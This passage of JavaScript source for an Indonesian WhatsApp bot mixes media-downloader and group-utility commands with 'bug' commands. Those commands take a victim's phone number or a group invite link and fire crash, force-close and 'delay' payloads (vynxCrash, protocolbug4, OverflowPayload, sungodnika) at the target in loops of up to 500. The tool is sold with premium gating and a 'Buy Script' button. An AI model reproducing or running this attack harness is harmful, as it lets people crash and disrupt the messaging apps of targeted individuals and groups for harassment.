    document: { url: "https://t.me/RizkyNotDev" },
    mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    fileName: "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
    fileLength: 999999999999999,
    pageCount: 99999,    
    caption: menu,
    footer: '© VynxNoCounter',
    
    buttons: buttons,
    headerType: 1,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: "𝐕𝐲𝐧𝐱𝐕", 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "peler",  
        renderLargerThumbnail: false, 
        showAdAttribution: false, 
        sourceId: 'Tes', 
        sourceType: 'PDF', 
        previewType: 'PDF', 
        sourceUrl: "https.íd.co/VynxOfficial", 
        thumbnail: fs.readFileSync('./image/vynx.jpg'), 
        thumbnailUrl: fs.readFileSync('./image/vynx.jpg'), 
        title: 'Vynxx',
      },
    },
    viewOnce: true,
    headerType: 6
  };
await vynx.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return payreply(mess.admin)
if (!m.quoted) return payreply("reply pesannya")
if (m.quoted.fromMe) {
vynx.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return payreply(mess.botAdmin)
vynx.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return payreply(mess.owner)
if (!m.quoted) return payreply(example("reply pesan"))
vynx.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//=======================================================
case "shadow": {
await vynx.sendMessage(m.chat, { react: { text: "🕊",key: m.key,}}); 
if (!q) return payreply(`Cara Penggunaan : *${command}* 628xxxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
    const captionText = `
𝐓𝐚𝐫𝐠𝐞𝐭 : *${pepec}* 
`;
let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "▢ Back" } },  
        { buttonId: ".sc", buttonText: { displayText: "▢ Buy Script" } }
    ];

    let flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: '𝐒𝐄𝐋𝐄𝐂𝐓 𝐁𝐔𝐆' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Select Button",
                    sections: [
                        {
                            title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜɢ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ",
                            highlight_label: "",
                            rows: [
                                 { title: "𝐒𝐡𝐚𝐝𝐨𝐰-𝐅𝐨𝐫𝐜𝐞🕊", description: "Forclose Hard", id: `.shadow-force ${pepec}` },
                                 { title: "𝐗𝐯𝐒𝐡𝐚𝐝𝐨𝐰🕊", description: "Forclose", id: `.xvdep ${pepec}` }, 
                                 { title: "𝐈𝐧𝐯𝐢𝐬-𝐕𝐱🕊", description: "Delay Maker", id: `.invis-vx ${pepec}` }, 
                                 { title: "𝐈𝐧𝐯𝐢𝐬-𝐒𝐡𝐚𝐝𝐨𝐰🕊", description: "Delay Maker Hard", id: `.invis-shadow ${pepec}` }                                                                                                              
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    await vynx.sendMessage(
        m.chat,
        {

            image: { url: 'https://img1.pixhost.to/images/5577/596061743_tamaofficial.jpg' },
            caption: captionText,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    mediaType: 1,
                    mediaUrl: 'https://img1.pixhost.to/images/5577/596061743_tamaofficial.jpg',
                    renderLargerThumbnail: false,
                    showAdAttribution: true,
                    sourceUrl: '120363409362506610@newsletter',
                    thumbnailUrl: 'https://img1.pixhost.to/images/5625/596653155_depayyy.jpg', 
                    title: "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    body: "",
                    mentionedJid: [m.sender],
                    isForwarded: true,
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: vynx.decodeJid(vynx.user.id),
                },
            },
            footer: "ShaowDeath",
            buttons: flowActions, // Menggunakan button list dengan Native Flow
            headerType: 1,
            viewOnce: true,
        },
        { quoted: lol }
    );
}
break;  

case 'shadow-group':
case 'force-group': {
    if (!isPremium && !isOwner) return payreply(`Khusus Owner`);
    if (!text) return payreply(`*Example:*\n${prefix + command} https:// Atau 9741@g.us`);
    
    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) return reply('invalid group link');

        try {
            let isTarget = await vynx.groupAcceptInvite(groupId);
            payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink} (Group ID: ${groupId})`);

            for (let r = 0; r < 300; r++) {
            await sungodnika(isTarget)
            await sleep(3000)
            await sungodnika(isTarget)
           }
        } catch (err) {
            return payreply(`Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.`);
        }

    } else {
        let isTarget = groupLink;
        payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink}`);

        for (let r = 0; r < 300; r++) {
            await sungodnika(isTarget)
            await sleep(3000)
            await sungodnika(isTarget)
        }
    }
}
break;

case 'shadow-force': {
    // Tambahkan pengecekan akses
    if (!isOwner && !isPremium) return payreply(`Fitur Bug Khusus Owner`)        
    if (!q) 
       payreply(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    vynx.sendMessage(m.chat, { 
        image: { url: `https://img1.pixhost.to/images/5577/596061743_tamaofficial.jpg` },
        caption: `╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣
┃ 𝐓𝐲𝐩𝐞 : shadow-force [ 𝐅𝐨𝐫𝐜𝐥𝐨𝐬𝐞𝐇𝐚𝐫𝐝 ]
┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${pepec}
┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Udah Ceklis 1 broo 🕊
┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 Menit!.
╰━━━━━━━━━━━━━━━━━⬣`,
        gifPlayback: true,
    }, { quoted: m });
    // Kirim bug ke target
    for (let i = 0; i < 5; i++) {
     await vynxCrash(target);
     await vynxCrash(target)
   }
   await vynxCrash(target);
   await vynxCrash(target)   
}
break

case 'xvshadow': {
    // Tambahkan pengecekan akses
    if (!isOwner && !isPremium) return payreply(`Fitur Bug Khusus Owner`)        
    if (!q) 
       payreply(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    vynx.sendMessage(m.chat, { 
        image: { url: `https://img1.pixhost.to/images/5523/595324611_depayyy.jpg` },
        caption: `╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣
┃ 𝐓𝐲𝐩𝐞 : xvshadow [ 𝐅𝐨𝐫𝐜𝐥𝐨𝐬𝐞 ]
┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${pepec}
┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Udah Ceklis 1 Broo 🕊
┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 Menit!.
╰━━━━━━━━━━━━━━━━━⬣`,
        gifPlayback: true,
    }, { quoted: m });
    // Kirim bug ke target
    for (let i = 0; i < 10; i++) {
     await vynxhardcrash(target);
     await vynxhardcrash(target)
     await vynx2(target);
   }
   await vynxhardcrash(target);
   await vynxhardcrash(target)
   await vynx2(target);
}
break

//CASE BUG DELAY
case 'invis-vx': {
    // Tambahkan pengecekan akses
    if (!isOwner && !isPremium) return payreply(`Fitur Bug Khusus Owner`)        
    if (!q) 
       payreply(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    vynx.sendMessage(m.chat, { 
        image: { url: `https://img1.pixhost.to/images/5577/596061743_tamaofficial.jpg` },
        caption: `╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣
┃ 𝐓𝐲𝐩𝐞 : invis-vx [ 𝐃𝐞𝐥𝐚𝐲 ]
┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${pepec}
┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Udah Ceklis 1 Broo 🕊
┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 Menit!.
╰━━━━━━━━━━━━━━━━━⬣`,
        gifPlayback: true,
    }, { quoted: m });
    // Kirim bug ke target
    for (let i = 0; i < 300; i++) {
     await protocolbug4(target);
     await vynx2(target);
     await vynx1(target);
     await nikadelay2(target)
     await mentionSw(target); 
     await OverflowPayload(target);
     await protocolbug4(target); 
   }
   await protocolbug4(target);
   await vynx2(target);
   await vynx1(target);
   await mentionSw(target)   
}
break

case 'invis-shadow': {
    // Tambahkan pengecekan akses
    if (!isOwner && !isPremium) return payreply(`Fitur Bug Khusus Owner`)        
    if (!q) 
       payreply(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    vynx.sendMessage(m.chat, { 
        image: { url: `https://img1.pixhost.to/images/5577/596061743_tamaofficial.jpg` },
        caption: `╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣
┃ 𝐓𝐲𝐩𝐞 : invis-shadow [ 𝐃𝐞𝐥𝐚𝐲 𝐇𝐚𝐫𝐝 ]
┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${pepec}
┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Udah Ceklis 1 Broo 🕊
┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 menit!.
╰━━━━━━━━━━━━━━━━━⬣`,
        gifPlayback: true,
    }, { quoted: m });
    // Kirim bug ke target
    for (let i = 0; i < 500; i++) {
     await protocolbug4(target);
     await vynx2(target);
     await vynx1(target) 
     await nikadelay2(target)
     await mentionSw(target); 
     await OverflowPayload(target);
     await protocolbug4(target); 
   }
   await protocolbug4(target);
   await vynx2(target);
   await vynx1(target);
   await mentionSw(target)   
}

case 'death-group': {
   if (!m.isGroup) return payreply('Khusus Bug Grup!!!')
   if (!isBot) return payreply(`*Can only be used in bot numbers*`)   
    payreply(`*Succes*`)
    {    
    await sungodnika(m.chat);
    await sungodnika(m.chat)
    await sungodnika(m.chat)
    await sungodnika(m.chat)
    await sungodnika(m.chat)
    await sungodnika(m.chat)
    await sungodnika(m.chat)
    await sungodnika(m.chat);
    await sungodnika(m.chat)
    await sungodnika(m.chat) 
    await sungodnika(m.chat)
    await sungodnika(m.chat);
    await sungodnika(m.chat)
    await sungodnika(m.chat)
    await sungodnika(m.chat);
    await sungodnika(m.chat)
    await sungodnika(m.chat)
    await sungodnika(m.chat);
    await sungodnika(m.chat)
    await sungodnika(m.chat) 
        }
    }
                break              
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clsesi": case "clearsession": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
payreply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "unblok": {
if (!isCreator) return payreply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return payreply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await vynx.updateBlockStatus(mem, "unblock");
if (m.isGroup) vynx.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "play": {
if (!text) return m.reply(example("dj tiktok"))
await vynx.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp3?url="+res.url)

if (anu.download.audio) {
let urlMp3 = anu.download.audio
await vynx.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await vynx.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playvid": {
if (!text) return m.reply(example("dj tiktok"))
await vynx.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp4?url="+res.url)

if (anu.download.video) {
let urlMp3 = anu.download.video
await vynx.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await vynx.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await vynx.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await vynx.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await vynx.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp3?url="+text)
if (anu.download.audio) {
let urlMp3 = anu.download.audio
await vynx.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await vynx.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "block": case "blok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await vynx.updateBlockStatus(mem, "block")
if (m.isGroup) vynx.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await vynx.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp4?url="+text)
if (anu.download.video) {
let urlMp3 = anu.download.video
await vynx.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await vynx.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mediafire": {
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("Error! Result Not Found")
await vynx.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await vynx.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await vynx.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await vynx.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "apkmod": {
if (!text) return payreply(example("capcut"))
await vynx.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/search/happymod?q=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
vynx.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => payreply("Gagal"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "instagram": case "igdl": case "ig": {
if (!text) return payreply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await vynx.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return payreply("Error! Result Not Found")
await vynx.sendMessage(m.chat, {video: {url: res.result.url}, mimetype: "video/mp4", caption: "*video Instagram berhasil ke download ✅ ✅*"}, {quoted: m})
await vynx.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => payreply("Gagal"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "facebook": case "fb": case "fbdl": {
if (!text) return payreply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await vynx.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/fbdl?url=${text}`).then(async (res) => {
if (!res.status) return payreply("Error! Result Not Found")
await vynx.sendMessage(m.chat, {video: {url: res.result.sd}, mimetype: "video/mp4", caption: "*video Facebook berhasil ke download ✅ ✅*"}, {quoted: m})
await vynx.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => payreply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "capcut": {
if (!text) return payreply(example("linknya"))
if (!text.startsWith('https://')) return payreply("Link tautan tidak valid")
await vynx.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/capcut?url=${text}`).then(async (res) => {
if (!res.status) return payreply("Error! Result Not Found")
await vynx.sendMessage(m.chat, {video: {url: res.result.video}, mimetype: "video/mp4", caption: "*Sukses*"}, {quoted: m})
await vynx.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gitclone": {
if (!text) return m.reply(example("https://github.com/Depay/Nika"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    vynx.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! repositori tidak ditemukan`)
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await vynx.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: vynx.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Sukses*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await vynx.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await vynx.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Sukses*`}, {quoted: m})
}
}).catch(e => console.log(e))
await vynx.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await vynx.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await vynx.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *List all group chat*\n`
let a = await vynx.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cekidch": case "idch": {
if (!text) return payreply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await vynx.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return payreply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pin": case "pinterest": {
if (!text) return m.reply(example("One Piece"))
await vynx.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: vynx.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await vynx.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await vynx.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gimage": {
if (!text) return m.reply(example("logo whatsapp"))
await vynx.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
const res = await fetchJson(`https://api.skyzopedia.us.kg/api/search/gimage?q=${text}`)
if (!res.status) return m.reply("Error")
let total = 0
let aray
if (res.result.length < 5) {
aray = res.result
} else {
aray = res.result.slice(0, 5)
}
for (let i of aray) {
await vynx.sendMessage(m.chat, {image: {url: i.url}, caption: `Hasil pencarian foto ke ${total += 1}`}, {quoted: m})
}
await vynx.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://api.skyzopedia.us.kg/api/ai/openai-prompt?prompt=Sekarang Kamu Adalah Nika-Ai dan selalu gunakan bahasa Indonesia saat menjawab semua pertanyaan&msg=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "brat": {
             const text = q
if (!text) return payreply(
`*CaraPenggunaan* \n ${prefix + command} Depay`);
             payreply(`𝗪𝗮𝗶𝘁...`);
const imageUrl = `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(text)}`;
const inputPath = path.join(__dirname, "temp_image.jpg");
const outputPath = path.join(__dirname, "sticker.webp");

try {
const response = await axios.get(imageUrl, { responseType: "arraybuffer" });
fs.writeFileSync(inputPath, response.data);
